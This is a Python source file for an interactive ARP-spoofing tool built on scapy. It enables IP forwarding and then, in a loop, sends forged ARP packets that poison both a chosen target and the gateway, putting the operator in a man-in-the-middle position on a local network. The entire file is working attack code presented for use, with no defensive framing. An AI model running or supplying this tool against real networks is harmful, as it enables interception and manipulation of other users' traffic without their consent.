import scapy.all as scapy
import os
import time
import subprocess
import threading

global targetip
global gatewayip
global targetmac
global gatewaymac
global num

targetmac = "0"
gatewaymac = "0"
targetip = "0"
gatewayip = "0"
print("Welcome to ARP Spoofer")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # enable ipforwarding to forward traffic

def arpspoof(targetmac, gatewayip, targetip, gatewaymac):
    
    while num == 0:
        targetmac = scapy.getmacbyip(targetip)
        gatewaymac = scapy.getmacbyip(gatewayip)
        # sends a arp packet to trick the target that i am the gateway address
        scapy.sendp(scapy.Ether(dst=targetmac)/scapy.ARP(psrc = gatewayip, pdst = targetip), verbose=False)
        # sends a arp packet to trick the target that i am the target address
        scapy.sendp(scapy.Ether(dst=gatewaymac)/scapy.ARP(psrc = targetip, pdst = gatewayip), verbose=False)
        time.sleep(5)#interval between packets
    

while True:
    
    a = input("> ")
    
    if a.startswith("set target"):
        tIP = a.split("set target ")[1]
        targetip = tIP
        output = subprocess.run(["ip route show default | awk '/default/ {print $3}'"], shell=True, capture_output=True, text=True)
        gatewayip = output.stdout
        print(f"target => {targetip}")

    if a.startswith("set gateway"):
        gIP = a.split("set gateway ")[1]
        gatewayip = gIP
        print(f"gateway => {gatewayip}")

    if a.startswith("show target"):
        print(f"targetip = {targetip}")

    if a.startswith("show gateway"):
        print(f"gateway = {gatewayip}")
    
    if a == "clear":
        os.system("clear")
    
    if a == "help":
        print("Lists of Commands\n\nset target <ipaddr> - set target address\n\nset gateway <addr> - manually set the gateway address(if left empty this will be automatically detected)\n\nshow target/gateway -shows address set\n\nrun - execute the arp poisoning attack\n\nkill - stop the attack\n\nclear - clears the terminal")

    if a == "kill":
        num = 1

    if a == "run":
        print("Sending ARP Packets")
        num = 0
        t = threading.Thread(target=arpspoof, args=(targetmac,gatewayip,targetip,gatewaymac)).start()







